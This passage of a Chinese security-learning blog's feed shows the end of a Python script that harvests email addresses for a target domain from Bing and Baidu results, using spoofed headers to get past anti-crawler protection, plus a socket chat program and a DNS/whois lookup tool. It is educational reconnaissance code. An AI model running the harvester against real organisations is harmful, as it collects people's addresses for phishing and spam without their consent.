keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> pages <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> key_word <span class="token keyword">in</span> key_words<span class="token punctuation">:</span>            bing_emails <span class="token operator">=</span> bing_search<span class="token punctuation">(</span>url<span class="token punctuation">,</span> page<span class="token punctuation">,</span> key_word<span class="token punctuation">)</span>            baidu_emails <span class="token operator">=</span> baidu_search<span class="token punctuation">(</span>url<span class="token punctuation">,</span> page<span class="token punctuation">,</span> key_word<span class="token punctuation">)</span>            sum_emails <span class="token operator">=</span> bing_emails <span class="token operator">+</span> baidu_emails            <span class="token keyword">for</span> email <span class="token keyword">in</span> sum_emails<span class="token punctuation">:</span>                <span class="token keyword">if</span> email <span class="token keyword">in</span> emails<span class="token punctuation">:</span>                    <span class="token keyword">pass</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span> <span class="token operator">+</span> email<span class="token punctuation">)</span>                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>email <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>                    emails<span class="token punctuation">.</span>append<span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">bing_search</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> page<span class="token punctuation">,</span> key_word<span class="token punctuation">)</span><span class="token punctuation">:</span>    referer <span class="token operator">=</span> <span class="token string">"https://cn.bing.com/search?q=site%3abaidu.com&amp;go=%E6%90%9C%E7%B4%A2&amp;qs=ds&amp;first=0&amp;FORM=PERE1"</span>    conn <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    bing_url <span class="token operator">=</span> <span class="token string">"https://cn.bing.com/search?q="</span> <span class="token operator">+</span> key_word <span class="token operator">+</span> <span class="token string">"+site%3a"</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">"&amp;qs=n&amp;sp=-1&amp;pq="</span> <span class="token operator">+</span> key_word <span class="token operator">+</span> <span class="token string">"site%3a"</span> \               <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">"&amp;first="</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>page <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;FROM=PERE1"</span>    conn<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://cn.bing.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">(</span>referer<span class="token punctuation">)</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> conn<span class="token punctuation">.</span>get<span class="token punctuation">(</span>bing_url<span class="token punctuation">,</span> stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">(</span>referer<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>    emails <span class="token operator">=</span> search_email<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">return</span> emails<span class="token keyword">def</span> <span class="token function">baidu_search</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> page<span class="token punctuation">,</span> key_word<span class="token punctuation">)</span><span class="token punctuation">:</span>    emails <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    referer <span class="token operator">=</span> <span class="token string">"https://www.baidu.com/s?wd=email+site%3Abaidu.com&amp;pn=1"</span>    baidu_url <span class="token operator">=</span> <span class="token string">"https://www.baidu.com/s?wd="</span> <span class="token operator">+</span> key_word <span class="token operator">+</span> <span class="token string">"+site%3A"</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">"&amp;pn="</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>page <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span>    conn <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">(</span>referer<span class="token punctuation">)</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> conn<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baidu_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">(</span>referer<span class="token punctuation">)</span><span class="token punctuation">)</span>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>    h3s <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'h3'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> h3 <span class="token keyword">in</span> h3s<span class="token punctuation">:</span>        href <span class="token operator">=</span> h3<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>href<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">(</span>referer<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>            emails <span class="token operator">=</span> search_email<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">pass</span>    <span class="token keyword">return</span> emails<span class="token keyword">def</span> <span class="token function">search_email</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">:</span>    emails <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+'</span><span class="token punctuation">,</span> html<span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>    <span class="token keyword">return</span> emails<span class="token keyword">def</span> <span class="token function">headers</span><span class="token punctuation">(</span>referer<span class="token punctuation">)</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span><span class="token punctuation">,</span>              <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>              <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span><span class="token punctuation">,</span>              <span class="token string">'Referer'</span><span class="token punctuation">:</span> referer<span class="token punctuation">,</span>              <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'</span>              <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> header<span class="token keyword">def</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    banner<span class="token punctuation">(</span><span class="token punctuation">)</span>    usage <span class="token operator">=</span> <span class="token string">"Usage: python3 %prog [Option] argv"</span>    parser <span class="token operator">=</span> optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span>usage<span class="token operator">=</span>usage<span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">"-u"</span><span class="token punctuation">,</span> <span class="token string">"--url"</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Target URL'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">"-p"</span><span class="token punctuation">,</span> <span class="token string">"--page"</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'page'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'int'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'The Page Will Be Searched in Search engine'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>        parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">(</span>options<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    center<span class="token punctuation">(</span>options<span class="token punctuation">.</span>url<span class="token punctuation">,</span> options<span class="token punctuation">.</span>page<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    go<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210415220648.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天继续，来看看子域名挖掘和邮件爬取，今天涉及的两者都是对网络爬虫的深入应用，从而实现信息搜集目的。并且因为是利用爬虫来爬取搜索引擎的信息，所以直接面临的就是百度等网站的反爬虫保护，而我们要实现工具的使用就需要绕过这些保护。&lt;/p&gt;
&lt;h1 id=&quot;前期准备&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="Python学习" scheme="http://yoursite.com/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python安全编程小练习1</title>
    <link href="http://yoursite.com/post/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B%E5%B0%8F%E7%BB%83%E4%B9%A01.html"/>
    <id>http://yoursite.com/post/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B%E5%B0%8F%E7%BB%83%E4%B9%A01.html</id>
    <published>2021-04-10T15:42:19.000Z</published>
    <updated>2021-06-28T14:41:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看MS08067实验室出的《Python安全攻防》一书，故而有此系列记录学习和练习情况。</p><h1 id="基于Socket库的聊天程序"><a href="#基于Socket库的聊天程序" class="headerlink" title="基于Socket库的聊天程序"></a>基于Socket库的聊天程序</h1><p>socket库之前也有接触过，第一次接触这个库实在做一个课程设计的时候，但是为了设计一个端口扫描器使用了socket库，所以这里再次遇到就不会那么陌生了。关于这个聊天程序，首先就是需要一个客户端和一个服务器端，由客户端发起连接到服务器端，从而建立一个链路来实现两台设备之间的通讯。 </p><h2 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h2><p>下面是客户端的源代码，使用try-except-else结构来实现异常处理：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=UTF-8</span><span class="token comment"># author: A1andNS</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">client</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> host    port <span class="token operator">=</span> <span class="token number">6666</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Server has some problem!"</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            c <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'myself:'</span><span class="token punctuation">)</span>            s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>c<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            data <span class="token operator">=</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>host <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> data<span class="token punctuation">)</span>            <span class="token keyword">if</span> c<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'bye'</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    Host <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入对方的IP地址:"</span><span class="token punctuation">)</span>    client<span class="token punctuation">(</span>Host<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h2><p>下面是服务器端的源代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=UTF-8</span><span class="token comment"># author: A1andNS</span><span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">Server</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>    port <span class="token operator">=</span> <span class="token number">6666</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Listening at port 6666"</span><span class="token punctuation">)</span>    conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connect by: '</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Received message: '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>        m <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Myself:"</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>m<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> m<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'bye'</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    Server<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h2><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/2021-04-11%2000-13-11%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="通讯截图"></p><p>这就是一个简单的聊天程序，通过调用socket库来建立一个通讯连接，然后分别发送信息和接受信息。</p><h1 id="DNS信息搜集小工具"><a href="#DNS信息搜集小工具" class="headerlink" title="DNS信息搜集小工具"></a>DNS信息搜集小工具</h1><p>DNS可用用于查询不少的信息，例如解析到IIP地址，whois查询等，这些都会为我们带来一些信息搜集上的帮助。通过Python现成的一些第三方库就可用实现一个简单的DNS小工具了，这里主要使用socket库和whois库来实现，辅助以time库和re库，主要也就两个功能一个是域名解析，一个是whois查询，由前者来实现，后者的工作主要是适当的延时以便于发现不同的IP地址，标准化域名以避免解析是报错。那么下面就看一下代码吧：</p><h2 id="Source-Code："><a href="#Source-Code：" class="headerlink" title="Source Code："></a>Source Code：</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=UTF-8</span><span class="token comment"># author: A1andNS</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> time<span class="token keyword">import</span> re<span class="token keyword">from</span> whois <span class="token keyword">import</span> whois<span class="token comment"># 匹配域名</span><span class="token keyword">def</span> <span class="token function">comp</span><span class="token punctuation">(</span>old_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'([a-z-]*[.]+)+[a-z]+'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>    name_temp <span class="token operator">=</span> pattern<span class="token punctuation">.</span>search<span class="token punctuation">(</span>old_name<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> name_temp<span class="token comment"># 查询ip</span><span class="token keyword">def</span> <span class="token function">to_ip</span><span class="token punctuation">(</span>new_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    ips <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]Domain Name: "</span> <span class="token operator">+</span> new_name<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"==========IP Address=========="</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>new_name<span class="token punctuation">)</span>        <span class="token keyword">if</span> ip <span class="token keyword">not</span> <span class="token keyword">in</span> ips<span class="token punctuation">:</span>            ips<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]IP Address: "</span> <span class="token operator">+</span> ip<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token comment"># whois查询</span><span class="token keyword">def</span> <span class="token function">to_whois</span><span class="token punctuation">(</span>new_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=============Whois============"</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> whois<span class="token punctuation">(</span>new_name<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">": "</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'name_servers'</span><span class="token punctuation">,</span> <span class="token string">'status'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> j <span class="token keyword">in</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>                    l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">'[+]'</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">' '</span> <span class="token operator">*</span> l<span class="token punctuation">)</span> <span class="token operator">+</span> j<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> j <span class="token keyword">in</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">";"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">';'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">' ____  _   _ ____    _____           _  '</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'|  _ \| \ | / ___|  |_   _|__   ___ | |___ '</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'| | | |  \| \___ \    | |/ _ \ / _ \| / __|'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'| | | |  \| \___ \    | |/ _ \ / _ \| / __|'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'|____/|_| \_|____/    |_|\___/ \___/|_|___/'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    logo<span class="token punctuation">(</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Please enter domain name:"</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> comp<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token comment"># print(name)</span>    to_ip<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    to_whois<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个应该是很简单了，应该大家也很容易就看懂了，为了风格统一和观看体验，我就多用了很多print语句，来稍微调整一下UI。下面看效果图：</p><h2 id="运行截图-1"><a href="#运行截图-1" class="headerlink" title="运行截图"></a>运行截图</h2><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/2021-04-10%2023-38-20%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="运行截图"></p><p>通过分析运行结果，可用搜集到一些有用的信息，例如公司名称，地址、域名注册商等等，例如上面这个例子，它的whois信息就非常全面了。</p><p>好了今天的小练习就到此结束了，该系列将会不定期更新。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近在看MS08067实验室出的《Python安全攻防》一书，故而有此系列记录学习和练习情况。&lt;/p&gt;
&lt;h1 id=&quot;基于Socket库的聊天程序&quot;&gt;&lt;a href=&quot;#基于Socket库的聊天程序&quot; class=&quot;headerlink&quot; title=&quot;基于Socket库</summary>
      
    
    
    
    <category term="Python学习" scheme="http://yoursite.com/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Linux Shortcut Maker</title>
    <link href="http://yoursite.com/post/Deepin-Shotcut-Maker.html"/>
    <id>http://yoursite.com/post/Deepin-Shotcut-Maker.html</id>
    <published>2021-04-06T14:33:25.000Z</published>
    <updated>2021-04-14T11:30:37.000Z</updated>
    
